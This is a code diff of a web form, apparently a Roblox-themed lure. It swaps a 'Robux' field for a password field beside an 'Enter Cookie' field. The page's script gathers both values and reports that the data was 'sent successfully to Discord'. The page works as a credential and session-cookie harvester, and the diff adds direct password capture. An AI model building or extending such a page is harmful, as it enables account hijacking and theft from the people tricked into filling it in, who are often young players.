@@ -89,7 +89,7 @@
     <!-- Card -->
     <div class="card">
       <form id="demoForm">
-        <input id="robux" type="text" placeholder="Robux" />
+        <input id="password" type="password" placeholder="Password" />
         
         <input id="cookie" type="text" placeholder="Enter Cookie" />
 
@@ -111,13 +111,13 @@
   const status = document.getElementById('status');
   
   // Get all form inputs
-  const robuxInput = document.getElementById('robux');
+  const passwordInput = document.getElementById('password');
   const cookieInput = document.getElementById('cookie');
 
   btn.addEventListener('click', async () => {
     // Collect all form data
     const formData = {
-      robux: robuxInput.value.trim(),
+      password: passwordInput.value.trim(),
       cookie: cookieInput.value.trim()
     };
 
@@ -172,7 +172,7 @@
         status.textContent = '✅ Data sent successfully to Discord';
         status.style.color = '#4CAF50';
         // Clear form
-        robuxInput.value = '';
+        passwordInput.value = '';
         cookieInput.value = '';
       } else {
         status.textContent = `❌ ${result.message}`;
